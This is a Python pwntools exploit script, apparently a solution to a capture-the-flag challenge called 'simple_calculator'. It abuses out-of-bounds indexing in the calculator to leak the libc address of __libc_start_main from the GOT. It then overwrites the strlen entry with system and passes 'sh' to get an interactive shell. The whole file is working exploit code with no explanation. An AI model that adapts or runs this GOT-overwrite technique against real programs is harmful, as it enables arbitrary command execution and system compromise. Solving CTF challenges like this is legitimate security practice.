#!/usr/bin/python
# -*- coding: UTF-8 -*-
from pwn import *

context.arch = 'amd64'

p = process('./simple_calculator')
elf = ELF('./libc.so.6')
# pause()

libc_start_main_offset = 0x21ab0

# -26 0x601ff0 <__libc_start_main@GLIBC_2.2.5>
payload = flat(
    "+ + -26"
)

p.sendlineafter(':', payload)

p.recvuntil("Here's your answer: ")
libc_start_main = p.recvline()

elf.address = int(libc_start_main) - libc_start_main_offset

# -21 : 0x602020 <strlen@GLIBC_2.2.5>
payload = flat(
    " + + -21 ",
    str(elf.sym.system),
    " sh "
)
p.sendlineafter(':', payload)

p.interactive()
p.close()
